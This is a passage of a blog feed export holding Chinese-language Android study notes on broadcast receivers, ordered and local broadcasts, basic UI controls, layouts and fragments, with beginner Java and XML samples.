Receiver，创建一个名为BootCompleteReceiver的接收器，</p><p>勾选Exported（是否允许这个广播接收器接收本程序以外的广播）和Enabled（是否启用这个广播）这两个选项，完成创建。并修改代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BootCompleteReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">"Boot Complete"</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外还需添加如下权限：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.RECEIVE_BOOT_COMPLETED"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>并修改receiver标签如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">".BootCompleteReceiver"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.BOOT_COMPLETED"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样开机时就可以接收到开机广播了。</p><h2 id="发送自定义广播"><a href="#发送自定义广播" class="headerlink" title="发送自定义广播"></a>发送自定义广播</h2><h3 id="发送标准广播"><a href="#发送标准广播" class="headerlink" title="发送标准广播"></a>发送标准广播</h3><p>首先新建一个MyBroadcastReceiver广播接收器来接收我们发送的广播：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">"I have received"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再<code>&lt;receiver&gt;</code>标签修改：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">".MyBroadcastReceiver"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.example.broadcasttest.MY_BROADCAST"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来在布局中添加一个按钮：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/button"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Send Broadcast"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后修改MainActivity的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button button = (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(<span class="string">"com.example.broadcasttest.MY_BROADCAST"</span>);</span><br><span class="line">                sendBroadcast(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样点下按钮后就可以发送接收到广播了。同时，因为广播是使用Intent传递的，所以还可以在Intent中携带一些数据传递给广播接收器。</p><h3 id="发送有序广播"><a href="#发送有序广播" class="headerlink" title="发送有序广播"></a>发送有序广播</h3><p>新建一个新的BroadcastTest2项目。</p><p>再新建一个名为AnotherBroadcastReceiver的接收器，修改为如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnotherBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">"received in AnotherBroadcastReceiver"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后继续添加intent-filter标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.example.broadcasttest.MY_BROADCAST"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后返回刚才按钮的界面发送广播，即可得证我们的应用程序发出的广播是可以被其他应用程序接收到的。</p><p>回到BroadcastTest项目中，修改如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    Button button = (Button) findViewById(R.id.button);</span><br><span class="line">    button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">            Intent intent = <span class="keyword">new</span> Intent(<span class="string">"com.example.broadcasttest.MY_BROADCAST"</span>);</span><br><span class="line">            sendOrderBroadcast(intent, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sendOrderBroadcast()用于发送有序广播，第二个参数是一个与权限有关的字符串。不过光是这样还不够，因为没有截断，所以还是会像标准广播一样两边都接收到，所以要再做以下修改：</p><p>修改MyBroadcastReceiver的标签内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">".MyBroadcastReceiver"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.example.broadcasttest.MY_BROADCAST"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>设置优先级为100。再修改MyBroadcastReceiver代码为如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">"I have received"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        abortBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用abortBroadcast()方法来截断这条广播。</p><p>这样就可以验证为有序广播了。</p><h2 id="使用本地广播"><a href="#使用本地广播" class="headerlink" title="使用本地广播"></a>使用本地广播</h2><p>前面接收和发送的广播全部属于系统全局广播，即发出的广播可以被其他任何应用程序接收到，并且也可以接收来自其他任何应用程序的广播。</p><p>本地广播发出的广播则只能在应用程序的内部进行传递，并且广播接收器也只能接收来自本应用程序发出的广播。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> IntentFilter intentFilter;</span><br><span class="line">    <span class="keyword">private</span> LocalReceiver localReceiver;</span><br><span class="line">    <span class="keyword">private</span> LocalBroadcastManager localBroadcastManager;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        localBroadcastManager = LocalBroadcastManager.getInstance(<span class="keyword">this</span>);</span><br><span class="line">       </span><br><span class="line">        Button button = (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(<span class="string">"com.example.broadcasttest.LOCAL_BROADCAST"</span>);</span><br><span class="line">                localBroadcastManager.sendBroadcast(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        intentFilter = <span class="keyword">new</span> IntentFilter();</span><br><span class="line">        intentFilter.addAction(<span class="string">"com.example.broadcasttest.LOCAL_BROADCAST"</span>);</span><br><span class="line">        localReceiver = <span class="keyword">new</span> LocalReceiver();</span><br><span class="line">        localBroadcastManager.registerReceiver(localReceiver, intentFilter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        localBroadcastManager.unregisterReceiver(localReceiver);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LocalReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span></span>&#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">"received local broadcast"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以完成发送com.example.broadcasttest.LOCAL_BROADCAST这条广播，并在localReceiver里去接收这条广播的功能。</p><p>注意，本地广播是无法通过静态注册的方式来接收的。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Android的广播分为两类：标准广播和有序广播。标准广播无法被截断，而有序广播中低优先级的接收器可以被高优先级的接收器截断广播。注册广播的方式有两类，动态注册和静态注册，其中动态注册的广播接收器必须要在程序启动后才能接收，而静态注册则不受限制，可以做到接收手机开机的广播。最后还有本地广播，可以限制广播只在当前应用程序中传播，并且可以限制只接收当前应用程序的广播。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;广播机制详解&quot;&gt;&lt;a href=&quot;#广播机制详解&quot; class=&quot;headerlink&quot; title=&quot;广播机制详解&quot;&gt;&lt;/a&gt;广播机制详解&lt;/h1&gt;&lt;h2 id=&quot;广播机制简介&quot;&gt;&lt;a href=&quot;#广播机制简介&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Android-day3</title>
    <link href="https://nuoye-blog.github.io/2020/05/27/Android/Android-day3/"/>
    <id>https://nuoye-blog.github.io/2020/05/27/Android/Android-day3/</id>
    <published>2020-05-27T05:40:00.000Z</published>
    <updated>2020-05-27T05:38:56.158Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>UI开发这块跟代码逻辑无关，所以快速扫过吧，具体内容可以直接找找官方文档。</p><h1 id="UI开发"><a href="#UI开发" class="headerlink" title="UI开发"></a>UI开发</h1><h2 id="常用的控件"><a href="#常用的控件" class="headerlink" title="常用的控件"></a>常用的控件</h2><h3 id="TestView"><a href="#TestView" class="headerlink" title="TestView"></a>TestView</h3><p>用于显示文本显示。</p><h3 id="Button"><a href="#Button" class="headerlink" title="Button"></a>Button</h3><p>用于实现按钮。</p><h3 id="EditText"><a href="#EditText" class="headerlink" title="EditText"></a>EditText</h3><p>用于实现输入框。</p><p>可以使用如下方法获取输入框内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EditText editText;</span><br><span class="line">editText = (EditText) findViewById(R.id.edit_text);</span><br><span class="line">Log.d(<span class="string">"MainActivity"</span>, editText.getText().toString())</span><br></pre></td></tr></table></figure><h3 id="ImageView"><a href="#ImageView" class="headerlink" title="ImageView"></a>ImageView</h3><p>用于在界面上显示图片。</p><p>可以用如下代码修改显示的图片为img_2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ImageView imageView;</span><br><span class="line">imageView &#x3D; (ImageView) findViewById(R.id.image_view);</span><br><span class="line">imageView.setImageResource(R.drawable.img_2);</span><br></pre></td></tr></table></figure><h3 id="ProgressBar"><a href="#ProgressBar" class="headerlink" title="ProgressBar"></a>ProgressBar</h3><p>用于显示进度条，表示我们的程序正在加载一些项目。</p><p>我们通过控件的setVisibility()来传入View.VISIBLE、View.INVISIBLE和View.GONE这三种值来设置控件的可见性，从而可以进行ProgressBar和其他控件的切换。</p><p>getVisibility()方法可以可判断控件是否可见。</p><h3 id="AlertDialog"><a href="#AlertDialog" class="headerlink" title="AlertDialog"></a>AlertDialog</h3><p>用于在当前界面弹出一个对话框，这个对话框是置顶于所有界面元素之上的，能够屏蔽掉其他控件的交互能力。</p><p>可以在活动中用以下代码创建：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">AlertDialog.Builder dialog = <span class="keyword">new</span> AlertDialog.Builder(MainActivity.<span class="keyword">this</span>);</span><br><span class="line">dialog.setTitle(<span class="string">"This is Dialog"</span>);</span><br><span class="line">dialog.setMessage(<span class="string">"Something important"</span>);</span><br><span class="line">dialog.cancelable(<span class="keyword">false</span>);</span><br><span class="line">dialog.setPositiveButton(<span class="string">"OK"</span>, <span class="keyword">new</span> DialogInterface.OnClickListener()&#123;</span><br><span class="line"><span class="meta">@override</span></span><br><span class="line"><span class="function">pubilc <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">dialog.setNegativeButton(<span class="string">"Cancel"</span>, <span class="keyword">new</span> DialogInterface.OnClickListener()&#123;</span><br><span class="line"><span class="meta">@override</span></span><br><span class="line"><span class="function">pubilc <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>创建完成后就可以用dialog.show()调用该AlertDialog了。</p><h3 id="ProgressDialog"><a href="#ProgressDialog" class="headerlink" title="ProgressDialog"></a>ProgressDialog</h3><p>弹出对话框以显示进度条。</p><h2 id="详解四种基本布局"><a href="#详解四种基本布局" class="headerlink" title="详解四种基本布局"></a>详解四种基本布局</h2><p><img src="./day3/1.jpg" alt=""></p><h3 id="LinearLayout线性布局"><a href="#LinearLayout线性布局" class="headerlink" title="LinearLayout线性布局"></a>LinearLayout线性布局</h3><h3 id="RelativeLayout相对布局"><a href="#RelativeLayout相对布局" class="headerlink" title="RelativeLayout相对布局"></a>RelativeLayout相对布局</h3><h3 id="FrameLayout帧布局"><a href="#FrameLayout帧布局" class="headerlink" title="FrameLayout帧布局"></a>FrameLayout帧布局</h3><h3 id="百分比布局"><a href="#百分比布局" class="headerlink" title="百分比布局"></a>百分比布局</h3><h2 id="创建自定义控件"><a href="#创建自定义控件" class="headerlink" title="创建自定义控件"></a>创建自定义控件</h2><p><img src="./day3/2.jpg" alt=""></p><p>View是Android中最基本的一种UI组件，它可以在屏幕上绘制一块矩形区域，并能响应这块区域的各种事件。</p><h2 id="ListView"><a href="#ListView" class="headerlink" title="ListView"></a>ListView</h2><h2 id="RecyclerView"><a href="#RecyclerView" class="headerlink" title="RecyclerView"></a>RecyclerView</h2><h1 id="探究碎片"><a href="#探究碎片" class="headerlink" title="探究碎片"></a>探究碎片</h1><h2 id="什么是碎片"><a href="#什么是碎片" class="headerlink" title="什么是碎片"></a>什么是碎片</h2><p>碎片是一种可以嵌入在活动当中的UI片段，它能让程序更加合理和充分地利用大屏幕的空间。</p><h2 id="动态添加碎片"><a href="#动态添加碎片" class="headerlink" title="动态添加碎片"></a>动态添加碎片</h2><p>动态添加碎片主要分为5步：</p><ol><li>创建待添加的碎片实例。</li><li>获取FragmentManager，在活动中可以直接通过调用getSupportFragmentManager()方法得到。</li><li>开启一个事务，通过调用beginTransaction()方法开启。</li><li>向容器内添加或替换碎片，一般使用replace()方法实现，需要传入容器的id和待添加的碎片实例。</li><li>提交事务，调用commit()方法来完成。</li></ol><h2 id="碎片的生命周期"><a href="#碎片的生命周期" class="headerlink" title="碎片的生命周期"></a>碎片的生命周期</h2><h3 id="碎片的状态和回调"><a href="#碎片的状态和回调" class="headerlink" title="碎片的状态和回调"></a>碎片的状态和回调</h3><h4 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h4><p>运行状态：当一个碎片是可见的，并且它所关联的活动正处于运行状态时，该碎片也处于运行状态。</p><p>暂停状态：当一个活动进入暂停状态，与它相关联的可见碎片就会进入到暂停状态。</p><p>停止状态：当一个活动进入停止状态时，与它相关联的碎片就会进入到停止状态，或者通过调用FragmentTransaction的remove()、replace()方法将碎片从活动中移除，但如果在事务提交之前调用addToBackStack()方法，这时的碎片也会进入到停止状态。</p><p>销毁状态：碎片总是依附于活动而存在的，因此当活动被销毁时，与它相关联的碎片就会进入到销毁状态。或者通过调用FragmentTransaction的remove()、replace()方法将碎片从活动中移除，但在事务提交之前并没有调用addToBackStack()方法，这时的碎片也会进入到销毁状态。</p><h4 id="回调方法"><a href="#回调方法" class="headerlink" title="回调方法"></a>回调方法</h4><p>onAttach()当碎片和活动建立关系的时候调用。</p><p>onCreateView()为碎片创建视图（加载布局）时调用。</p><p>onActivityCreated()确保与碎片相关联的活动一定已经创建完毕的时候调用。</p><p>onDestoryView()当与碎片关联的视图被移除的时候调用。</p><p>onDetach()当碎片和活动解除关联的时候调用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;UI开发这块跟代码逻辑无关，所以快速扫过吧，具体内容可以直接找找官方文档。&lt;/p&gt;
&lt;h1 id=&quot;UI开发&quot;&gt;&lt;a href=&quot;#UI开发
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Android-day2</title>
    <link href="https://nuoye-blog.github.io/2020/05/26/Android/Android-day2/"/>
    <id>https://nuoye-blog.github.io/2020/05/26/Android/Android-day2/</id>
    <published>2020-05-26T08:20:00.000Z</published>
    <updated>2020-05-26T08:16:16.613Z</updated>
    
    <content type="html"><![CDATA[<h1 id="探究活动"><a href="#探究活动" class="headerlink" title="探究活动"></a>探究活动</h1><h2 id="什么是活动"><a href="#什么是活动" class="headerlink" title="什么是活动"></a>什么是活动</h2><p>活动是一种可以包含用户界面的控件，主要用于和用户进行交互。一个应用程序中可以包含零个或多个活动。</p><h2 id="活动的基本用法"><a href="#活动的基本用法" class="headerlink" title="活动的基本用法"></a>活动的基本用法</h2><p>首先我们新建个项目ActivityTest来进行练习，模板选择的时候选择add no activity。</p><h3 id="手动创建活动"><a href="#手动创建活动" class="headerlink" title="手动创建活动"></a>手动创建活动</h3><p>右键点击com.example.activitytest包-&gt;New-&gt;Activity-&gt;Empty Activity。</p><p>取名FirstActivity，并且不要勾选Generate Layout File和Launcher Activity这两个选项。</p><h3 id="创建和加载布局"><a href="#创建和加载布局" class="headerlink" title="创建和加载布局"></a>创建和加载布局</h3><p>右击app/src/main/res目录-&gt;New-&gt;Directory，就会弹出一个新建目录窗口，这里创建一个名为layout的目录。然后对着layout目录右键-&gt;Layout resource file，又会弹出一个新建布局资源的窗口，我们将这个布局文件命名为first_layout，根元素就默认选择为LinearLayout，确认即可。</p><p>然后添加个按钮，修改代码为如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:id</span>=<span 